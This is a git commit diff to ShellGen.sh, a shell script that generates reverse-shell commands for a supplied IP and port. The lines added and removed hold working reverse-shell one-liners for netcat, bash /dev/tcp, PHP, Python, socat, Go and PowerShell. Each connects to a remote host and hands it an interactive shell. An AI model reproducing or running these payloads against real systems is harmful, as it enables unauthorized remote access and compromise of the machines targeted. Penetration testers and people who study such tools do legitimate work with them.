aeff430a6ef7eb312bf3cfa189cb9fe6f713146d
Rohan Sharma <64310528+r0han21@users.noreply.github.com>
2021-09-04 18:07:52 +0530

    Update ShellGen.sh

--- ShellGen.sh
+++ ShellGen.sh
@@ -20,12 +20,10 @@ else
                         echo -e "\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f\n\n\t\tOR\t\t\n\nnc -e /bin/sh $1 $2\n"
 
                 elif [ $choice == "3" ]; then
-                        echo -e "\nphp -r '\$sock=fsockopen("$1",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)\n\n\t\tOR\t\
-t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'\");?>\n"
+                        echo -e "\nphp -r '\$sock=fsockopen("$1",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)\n\n\t\tOR\t\t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'\");?>\n"
 
                 elif [ $choice == "4" ]; then
-                        echo -e "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno()
-,1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
+                        echo -e "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
 
                 elif [ $choice == "5" ]; then
                         echo -e "\nsocat tcp:$1:$2 exec:'bash -i' ,pty,stderr,setsid,sigint,sane &\n"
@@ -35,10 +33,7 @@ t\n\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'\");?>\n"
 http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go\n"
 
                 elif [ $choice == "7" ]; then
-                        echo -e "\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$1\",$2);$stream = \$client.GetStream();[byte[]]\$bytes = 0
-..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-St
-ring );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);$stream.Flush()};$cl
-ient.Close()\n"
+                        echo -e "\npowershell -command \"\$client = New-Object System.Net.Sockets.TCPClient('$1',$2);\$stream = \$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while((\$i = \$stream.Read($bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, $i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\n"
 
                 fi
 
